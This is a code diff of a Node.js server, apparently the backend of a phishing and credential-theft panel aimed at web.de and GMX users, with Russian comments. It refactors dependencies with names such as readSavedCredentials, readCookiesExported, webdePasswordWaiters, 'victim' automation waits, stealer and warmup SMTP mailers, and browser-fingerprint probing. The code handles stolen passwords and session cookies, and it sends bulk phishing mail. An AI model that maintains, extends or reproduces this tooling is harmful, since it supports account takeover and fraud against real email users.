-  WEBDE_PROBE_MAX_INDICES_PER_JOB: WEBDE_PROBE_MAX_INDICES_PER_JOB,
   WEBDE_SCRIPT_VICTIM_WAIT_MS: WEBDE_SCRIPT_VICTIM_WAIT_MS,
   WEBDE_WAIT_PASSWORD_TIMEOUT_MS: WEBDE_WAIT_PASSWORD_TIMEOUT_MS,
   ZIP_PASSWORD_FILE: ZIP_PASSWORD_FILE,
@@ -2347,7 +1044,6 @@ const ROUTE_HTTP_DEPS = {
   archiveFlagIsSet: archiveFlagIsSet,
   automationService: automationService,
   broadcastLeadsUpdate: broadcastLeadsUpdate,
-  buildWebdeFingerprintsListPayload: buildWebdeFingerprintsListPayload,
   chatService: chatService,
   checkRateLimit: checkRateLimit,
   cleanupRateLimit: cleanupRateLimit,
@@ -2378,10 +1074,6 @@ const ROUTE_HTTP_DEPS = {
   getSicherheitDownloadFileByLimit: getSicherheitDownloadFileByLimit,
   getSicherheitDownloadFiles: getSicherheitDownloadFiles,
   getSlotForLead: getSlotForLead,
-  handleWebdeFingerprintProbePause: handleWebdeFingerprintProbePause,
-  handleWebdeFingerprintProbeResume: handleWebdeFingerprintProbeResume,
-  handleWebdeFingerprintProbeStart: handleWebdeFingerprintProbeStart,
-  hasGateCookie: gateMiddleware.hasGateCookie,
   http: http,
   https: https,
   incrementDownloadCount: incrementDownloadCount,
@@ -2389,7 +1081,6 @@ const ROUTE_HTTP_DEPS = {
   isAdminRequest: isAdminRequest,
   isLocalHost: isLocalHost,
   leadEventTerminalHasExactLabel: leadEventTerminalHasExactLabel,
-  leadHasAnyConfigEmailSentEvent: leadHasAnyConfigEmailSentEvent,
   leadHasKleinMarkedData: leadHasKleinMarkedData,
   leadHasSavedCookies: leadHasSavedCookies,
   leadIsWorkedFromEvents: leadIsWorkedFromEvents,
@@ -2400,13 +1091,10 @@ const ROUTE_HTTP_DEPS = {
   net: net,
   normalizePasswordHistory: normalizePasswordHistory,
   os: os,
-  parseSmtpLine: parseSmtpLine,
-  parseSmtpLines: parseSmtpLines,
   path: path,
   persistLeadFull: persistLeadFull,
   persistLeadPatch: persistLeadPatch,
   processArchiveToGmx: processArchiveToGmx,
-  pruneWebdeProbeJobs: pruneWebdeProbeJobs,
   pushEvent: pushEvent,
   pushPasswordHistory: pushPasswordHistory,
   pushSubmitPipelineEvent: pushSubmitPipelineEvent,
@@ -2415,7 +1103,6 @@ const ROUTE_HTTP_DEPS = {
   readAndroidDownloadLimits: readAndroidDownloadLimits,
   readAutoScript: readAutoScript,
   readCheckMeta: readCheckMeta,
-  readConfigEmail: readConfigEmail,
   readCookiesExported: readCookiesExported,
   readDownloadCounts: readDownloadCounts,
   readDownloadFilesConfig: readDownloadFilesConfig,
@@ -2429,45 +1116,25 @@ const ROUTE_HTTP_DEPS = {
   readSavedCredentials: readSavedCredentials,
   readShortDomains: readShortDomains,
   readStartPage: readStartPage,
-  readStealerEmailConfig: readStealerEmailConfig,
-  readWarmupEmailConfig: readWarmupEmailConfig,
-  readWarmupSmtpStats: readWarmupSmtpStats,
-  readWebdeFingerprintsPoolArr: readWebdeFingerprintsPoolArr,
-  readWebdeFingerprintsPoolMeta: readWebdeFingerprintsPoolMeta,
-  readWebdeFpIndicesAllowedForProbe: readWebdeFpIndicesAllowedForProbe,
   readZipPassword: readZipPassword,
   resolveLeadId: resolveLeadId,
   resolvePlatform: resolvePlatform,
-  runWarmupStep: runWarmupStep,
   sanitizeFilenameForHeader: sanitizeFilenameForHeader,
-  sendStealerFailedSmtpEmails: sendStealerFailedSmtpEmails,
-  sendStealerSmtpIndex: sendStealerSmtpIndex,
-  sendWebdeFingerprintProbeStatus: sendWebdeFingerprintProbeStatus,
   setFirstGateTime: setFirstGateTime,
   short: short,
   slotFromLeadId: slotFromLeadId,
   smsCodeDataKindForLead: smsCodeDataKindForLead,
-  spawnTimedOut: spawnTimedOut,
   statusHeartbeats: statusHeartbeats,
   submitPipelineDetail: submitPipelineDetail,
   submitPipelineEventRaw: submitPipelineEventRaw,
-  summarizeWebdeFingerprintEntry: summarizeWebdeFingerprintEntry,
   suppressVictimPushPageForKleinContext: suppressVictimPushPageForKleinContext,
-  tryRepairAndExtractZip: tryRepairAndExtractZip,
   url: url,
-  warmupState: warmupState,
   webdeErrorTriggersVictimAutomationWait: webdeErrorTriggersVictimAutomationWait,
-  webdeFpProbeIndexCursor: webdeFpProbeIndexCursor,
   webdePasswordWaiters: webdePasswordWaiters,
-  webdeProbeJobSeq: webdeProbeJobSeq,
-  webdeProbeJobs: webdeProbeJobs,
-  webdeProbeRunOneBatch: webdeProbeRunOneBatch,
-  webdeProbeScheduleContinue: webdeProbeScheduleContinue,
   webdePushResendRequested: webdePushResendRequested,
   writeAndroidDownloadConfig: writeAndroidDownloadConfig,
   writeAndroidDownloadLimits: writeAndroidDownloadLimits,
   writeCheckMeta: writeCheckMeta,
-  writeConfigEmail: writeConfigEmail,
   writeCookiesExported: writeCookiesExported,
   writeDebugLog: writeDebugLog,
   writeDownloadCounts: writeDownloadCounts,
@@ -2481,9 +1148,6 @@ const ROUTE_HTTP_DEPS = {
   writeSavedCredentials: writeSavedCredentials,
   writeShortDomains: writeShortDomains,
   writeStartPage: writeStartPage,
-  writeStealerEmailConfig: writeStealerEmailConfig,
-  writeWarmupEmailConfig: writeWarmupEmailConfig,
-  writeWarmupSmtpStats: writeWarmupSmtpStats,
   writeZipPassword: writeZipPassword,
   yauzl: yauzl,
   buildAutomationProfile: buildAutomationProfile,
@@ -2496,7 +1160,7 @@ const ROUTE_HTTP_DEPS = {
   setWebdeLeadScriptStatus: setWebdeLeadScriptStatus,
   touchWebdeScriptLock: touchWebdeScriptLock,
   webdeLoginChildByLeadId: webdeLoginChildByLeadId,
-};
+});
 
 const server = http.createServer(async (req, res) => {
   // Обработка CORS preflight запросов
@@ -2725,16 +1389,7 @@ server.on('error', (err) => {
 });
 
 if (WebSocketServer) {
-  const wss = new WebSocketServer({ server: server, path: '/ws' });
-  global.__gmwWssBroadcast = function () {
-    const msg = JSON.stringify({ type: 'leads-update' });
-    wss.clients.forEach(function (client) {
-      if (client.readyState === 1) try { client.send(msg); } catch (e) {}
-    });
-  };
-  wss.on('connection', function (ws) {
-    console.log('[SERVER] WebSocket: админ подключён');
-  });
+  attachAdminLeadsWebSocket(WebSocketServer, server);
 } else {
   console.log('[SERVER] WebSocket не подключён (установите: npm install ws)');
 }
@@ -2759,7 +1414,7 @@ process.on('unhandledRejection', (reason, promise) => {
 // При старте: создать критичные каталоги и сообщить о необязательных зависимостях
 ensureDataFile();
 if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
-if (!nodemailer) console.log('[SERVER] nodemailer не установлен — рассылка stealer/warmup недоступна (npm install nodemailer)');
+if (!mailService.getNodemailer()) console.log('[SERVER] nodemailer не установлен — рассылка stealer/warmup недоступна (npm install nodemailer)');
 if (!WebSocketServer) console.log('[SERVER] ws не установлен — обновление админки в реальном времени отключено (npm install ws)');
 
 function cleanLoginArtifacts() {
